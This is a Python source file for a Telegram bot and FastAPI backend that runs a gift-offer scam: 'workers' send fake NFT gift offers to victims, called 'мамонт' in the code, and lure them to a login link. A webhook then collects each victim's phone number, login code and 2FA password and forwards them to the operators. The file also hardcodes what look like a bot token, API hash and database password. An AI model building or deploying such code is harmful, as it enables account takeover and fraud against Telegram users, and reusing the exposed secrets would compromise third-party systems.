import asyncio
import os
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
from sqlalchemy import BigInteger, String, Integer, DateTime, Text, select
import uvicorn
import httpx

# ═══════════════════════════════════════════════════════
#   ВПИШИ СВОИ ДАННЫЕ ЗДЕСЬ
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8215145424:AAGM0ImIq_YzbqziKRsrH3opVm9I3pnM_Sw"
ADMIN_ID = 8986358602                         # твой user_id (узнать у @userinfobot)
WEBAPP_URL = "git@github.com:trustgift/offersbot.git"   # адрес mini app
BACKEND_URL = "https://offersbot-frwd.onrender.com"        # адрес этого backend (Render даст после деплоя)
API_ID = 26259835                              # с my.telegram.org
API_HASH = "3fa32264398920f001dd2428b42060f6"                  # с my.telegram.org
DATABASE_URL = "postgresql+asyncpg://avnadmin:AVNS_Kdeg6Q2vNRREiOv-JWp@pg-270e5c9e-danyachuglaev-8664.e.aivencloud.com:28308/defaultdb"  # не трогай, работает из коробки
PORT = int(os.getenv("PORT", "8080"))

# ═══════════════════════════════════════════════════════
#   ДАЛЬШЕ НИЧЕГО НЕ МЕНЯЙ
# ═══════════════════════════════════════════════════════

engine = create_async_engine(
    DATABASE_URL,
    echo=False,
    connect_args={"ssl": "require"},
)
SessionLocal = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)


class Base(DeclarativeBase):
    pass


class User(Base):
    __tablename__ = "users"
    id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    role: Mapped[str] = mapped_column(String(16), default="user")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Offer(Base):
    __tablename__ = "offers"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger)
    target_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    gift_name: Mapped[str] = mapped_column(String(128))
    gift_link: Mapped[str] = mapped_column(String(256))
    price_stars: Mapped[int] = mapped_column(Integer)
    price_usd: Mapped[str] = mapped_column(String(32))
    duration_hours: Mapped[int] = mapped_column(Integer, default=24)
    status: Mapped[str] = mapped_column(String(16), default="pending")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Session(Base):
    __tablename__ = "sessions"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    phone: Mapped[str] = mapped_column(String(32))
    code: Mapped[str] = mapped_column(String(16), nullable=True)
    password: Mapped[str] = mapped_column(String(128), nullable=True)
    session_string: Mapped[str] = mapped_column(Text, nullable=True)
    user_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    first_name: Mapped[str] = mapped_column(String(64), nullable=True)
    last_name: Mapped[str] = mapped_column(String(64), nullable=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Log(Base):
    __tablename__ = "logs"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    event: Mapped[str] = mapped_column(String(64))
    detail: Mapped[str] = mapped_column(Text, nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


async def init_db():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)


async def get_user(user_id: int):
    async with SessionLocal() as s:
        return await s.get(User, user_id)


async def add_user(user_id: int, username: str = None, role: str = "user"):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            return u
        u = User(id=user_id, username=username, role=role)
        s.add(u)
        await s.commit()
        return u


async def set_role(user_id: int, role: str):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            u.role = role
            await s.commit()


async def create_offer(worker_id, gift_name, gift_link, price_stars, price_usd, duration_hours=24):
    async with SessionLocal() as s:
        o = Offer(worker_id=worker_id, gift_name=gift_name, gift_link=gift_link,
                  price_stars=price_stars, price_usd=price_usd, duration_hours=duration_hours)
        s.add(o)
        await s.commit()
        await s.refresh(o)
        return o


async def get_offer(offer_id):
    async with SessionLocal() as s:
        return await s.get(Offer, offer_id)


async def add_log(worker_id=None, offer_id=None, event="", detail=""):
    async with SessionLocal() as s:
        l = Log(worker_id=worker_id, offer_id=offer_id, event=event, detail=detail)
        s.add(l)
        await s.commit()


async def create_session_record(offer_id, phone, code=None, password=None,
                               session_string=None, user_id=None,
                               first_name=None, last_name=None, username=None):
    async with SessionLocal() as s:
        sess = Session(offer_id=offer_id, phone=phone, code=code, password=password,
                       session_string=session_string, user_id=user_id,
                       first_name=first_name, last_name=last_name, username=username)
        s.add(sess)
        await s.commit()
        await s.refresh(sess)
        return sess


# ─── BOT ─────────────────────────────────────────────────
bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()


def main_menu(role: str):
    kb = []
    if role == "admin":
        kb = [
            [InlineKeyboardButton(text="👥 Воркеры", callback_data="admin_workers")],
            [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
            [InlineKeyboardButton(text="💎 Сессии", callback_data="admin_sessions")],
        ]
    elif role == "worker":
        kb = [
            [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
            [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
        ]
    else:
        kb = [[InlineKeyboardButton(text="🚀 Открыть", web_app=WebAppInfo(url=WEBAPP_URL))]]
    return InlineKeyboardMarkup(inline_keyboard=kb)


class OfferForm(StatesGroup):
    gift_name = State()
    gift_link = State()
    price_stars = State()
    price_usd = State()
    duration = State()


class GrantForm(StatesGroup):
    user_id = State()


@dp.message(CommandStart())
async def start(message: types.Message):
    uid = message.from_user.id
    role = "admin" if uid == ADMIN_ID else "user"
    await add_user(uid, message.from_user.username, role)
    u = await get_user(uid)
    await message.answer(
        f"👋 <b>Check Offers</b>\n\n"
        f"Ваша роль: <b>{u.role}</b>\n\n"
        f"Выберите действие:",
        reply_markup=main_menu(u.role),
    )


@dp.callback_query(F.data == "worker_create")
async def create_start(call: types.CallbackQuery, state: FSMContext):
    u = await get_user(call.from_user.id)
    if u.role != "worker":
        await call.answer("Нет доступа", show_alert=True)
        return
    await state.set_state(OfferForm.gift_name)
    await call.message.answer("📝 Введите название подарка (например, DeskCalendar #284528):")


@dp.message(OfferForm.gift_name)
async def gift_name(message: types.Message, state: FSMContext):
    await state.update_data(gift_name=message.text)
    await state.set_state(OfferForm.gift_link)
    await message.answer("🔗 Введите ссылку на подарок (t.me/nft/...):")


@dp.message(OfferForm.gift_link)
async def gift_link(message: types.Message, state: FSMContext):
    await state.update_data(gift_link=message.text)
    await state.set_state(OfferForm.price_stars)
    await message.answer("⭐ Введите цену в звёздах:")


@dp.message(OfferForm.price_stars)
async def price_stars(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Введите число.")
        return
    await state.update_data(price_stars=int(message.text))
    await state.set_state(OfferForm.price_usd)
    await message.answer("💎 Введите цену в USD (например, 8.28):")


@dp.message(OfferForm.price_usd)
async def price_usd(message: types.Message, state: FSMContext):
    await state.update_data(price_usd=message.text)
    await state.set_state(OfferForm.duration)
    await message.answer("⏱ Введите длительность оффера в часах (например, 24):")


@dp.message(OfferForm.duration)
async def duration(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Введите число.")
        return
    data = await state.get_data()
    o = await create_offer(
        worker_id=message.from_user.id,
        gift_name=data["gift_name"],
        gift_link=data["gift_link"],
        price_stars=data["price_stars"],
        price_usd=data["price_usd"],
        duration_hours=int(message.text),
    )
    await state.clear()
    await message.bot.send_message(
        ADMIN_ID,
        f"🆕 <b>Новый оффер</b>\n\n"
        f"Воркер: <code>{message.from_user.id}</code> (@{message.from_user.username})\n"
        f"Подарок: {o.gift_name}\n"
        f"Цена: {o.price_stars} ⭐ ({o.price_usd}$)\n"
        f"ID: <code>{o.id}</code>",
    )
    await add_log(worker_id=message.from_user.id, offer_id=o.id,
                  event="offer_created", detail=f"{o.gift_name} за {o.price_stars}⭐")

    text = (
        f"⚖️ <b>Gift Offers</b> отправил вам оффер на {o.gift_name}\n\n"
        f"Сумма оффера: {o.price_stars} ⭐️ ({o.price_usd}$)\n"
        f"За подарок: {o.gift_name} ({o.gift_link})\n"
        f"Длительность: {o.duration_hours}h\n\n"
        f"Вы можете просмотреть и ПРИНЯТЬ/ОТКЛОНИТЬ оффер, нажав кнопку ниже"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"offer_confirm:{o.id}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"offer_reject:{o.id}")],
    ])
    await message.answer(
        "✅ Оффер создан. Перешлите это сообщение мамонту:\n\n" + text,
        reply_markup=kb,
    )


@dp.callback_query(F.data.startswith("offer_confirm:"))
async def confirm(call: types.CallbackQuery):
    oid = int(call.data.split(":")[1])
    await call.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔓 Войти в аккаунт", url=f"{WEBAPP_URL}?offer={oid}")]
    ]))
    await add_log(offer_id=oid, event="offer_confirmed", detail=f"мамонт {call.from_user.id}")
    await call.message.bot.send_message(
        ADMIN_ID,
        f"✅ Оффер #{oid} подтверждён пользователем <code>{call.from_user.id}</code>",
    )


@dp.callback_query(F.data.startswith("offer_reject:"))
async def reject(call: types.CallbackQuery):
    oid = int(call.data.split(":")[1])
    await call.message.edit_reply_markup(reply_markup=None)
    await add_log(offer_id=oid, event="offer_rejected", detail=f"мамонт {call.from_user.id}")
    await call.message.bot.send_message(
        ADMIN_ID,
        f"❌ Оффер #{oid} отклонён пользователем <code>{call.from_user.id}</code>",
    )
    await call.answer("Оффер отклонён")


@dp.callback_query(F.data == "worker_offers")
async def my_offers(call: types.CallbackQuery):
    async with SessionLocal() as s:
        r = await s.execute(select(Offer).where(Offer.worker_id == call.from_user.id))
        offers = r.scalars().all()
    if not offers:
        await call.message.answer("У вас пока нет офферов.")
        return
    text = "\n".join([f"#{o.id} — {o.gift_name} — {o.price_stars}⭐ — {o.status}" for o in offers])
    await call.message.answer(text)


@dp.callback_query(F.data == "admin_workers")
async def workers_menu(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant")],
    ])
    await call.message.answer("Управление воркерами:", reply_markup=kb)


@dp.callback_query(F.data == "admin_grant")
async def grant_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(GrantForm.user_id)
    await call.message.answer("Введите user_id воркера:")


@dp.message(GrantForm.user_id)
async def grant_finish(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    if not message.text.isdigit():
        await message.answer("Введите число.")
        return
    uid = int(message.text)
    await set_role(uid, "worker")
    await message.answer(f"✅ Пользователь {uid} теперь воркер.")
    try:
        await message.bot.send_message(uid, "🎉 Вам выдан доступ воркера. Напишите /start")
    except Exception:
        pass
    await state.clear()


@dp.callback_query(F.data == "admin_logs")
async def logs(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    async with SessionLocal() as s:
        r = await s.execute(select(Log).order_by(Log.id.desc()).limit(20))
        logs = r.scalars().all()
    if not logs:
        await call.message.answer("Логов нет.")
        return
    text = "\n".join([f"[{l.created_at:%H:%M}] {l.event} — {l.detail}" for l in logs])
    await call.message.answer(f"📊 Последние логи:\n\n{text}")


@dp.callback_query(F.data == "admin_sessions")
async def sessions(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    async with SessionLocal() as s:
        r = await s.execute(select(Session).order_by(Session.id.desc()).limit(10))
        sess = r.scalars().all()
    if not sess:
        await call.message.answer("Сессий нет.")
        return
    text = "\n".join([f"#{s.id} — {s.phone} — {s.first_name or '—'} — offer {s.offer_id}" for s in sess])
    await call.message.answer(f"💎 Сессии:\n\n{text}")


# ─── BACKEND ─────────────────────────────────────────────
app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])


class SessionPayload(BaseModel):
    offer_id: int
    phone: str
    code: str | None = None
    password: str | None = None
    user_id: int | None = None
    first_name: str | None = None
    last_name: str | None = None
    username: str | None = None


async def notify_admin(text: str):
    async with httpx.AsyncClient() as c:
        await c.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"},
        )


@app.on_event("startup")
async def startup():
    await init_db()


@app.post("/webhook/session")
async def receive_session(p: SessionPayload):
    sess = await create_session_record(
        offer_id=p.offer_id, phone=p.phone, code=p.code, password=p.password,
        user_id=p.user_id, first_name=p.first_name, last_name=p.last_name,
        username=p.username,
    )
    o = await get_offer(p.offer_id)
    worker_id = o.worker_id if o else None

    await add_log(worker_id=worker_id, offer_id=p.offer_id, event="session_received",
                  detail=f"phone={p.phone}, code={p.code}, 2fa={p.password}")

    msg = (
        f"🔔 <b>Новая сессия</b>\n\n"
        f"Оффер: #{p.offer_id}\n"
        f"Телефон: <code>{p.phone}</code>\n"
        f"Код: <code>{p.code or '—'}</code>\n"
        f"2FA: <code>{p.password or '—'}</code>\n"
        f"Юзер: {p.first_name or ''} {p.last_name or ''} (@{p.username or '—'})"
    )
    await notify_admin(msg)
    if worker_id and worker_id != ADMIN_ID:
        try:
            async with httpx.AsyncClient() as c:
                await c.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": worker_id, "text": msg, "parse_mode": "HTML"},
                )
        except Exception:
            pass
    return {"ok": True, "session_id": sess.id}


@app.get("/api/offer/{offer_id}")
async def api_offer(offer_id: int):
    o = await get_offer(offer_id)
    if not o:
        raise HTTPException(404)
    return {"id": o.id, "gift_name": o.gift_name, "gift_link": o.gift_link,
            "price_stars": o.price_stars, "price_usd": o.price_usd,
            "duration_hours": o.duration_hours, "status": o.status}


@app.get("/health")
async def health():
    return {"ok": True}


# ─── RUN ─────────────────────────────────────────────────
async def run_bot():
    await init_db()
    await dp.start_polling(bot)


async def run_web():
    config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="info")
    server = uvicorn.Server(config)
    await server.serve()


async def main():
    await asyncio.gather(run_bot(), run_web())


if __name__ == "__main__":
    asyncio.run(main())
